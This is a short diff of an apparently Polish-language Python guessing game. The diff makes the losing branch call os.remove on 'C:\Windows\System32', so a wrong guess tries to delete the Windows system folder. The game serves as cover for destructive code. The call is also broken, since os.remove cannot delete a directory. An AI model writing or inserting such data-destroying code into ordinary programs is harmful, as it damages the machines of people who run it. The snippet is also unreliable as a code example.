@@ -8,4 +8,4 @@ a=int(input("podaj lidzbe"))
 if a==b:
     print("wygrales")
 else:
-    os.remove system32
+    os.remove ("C:\Windows\System32")
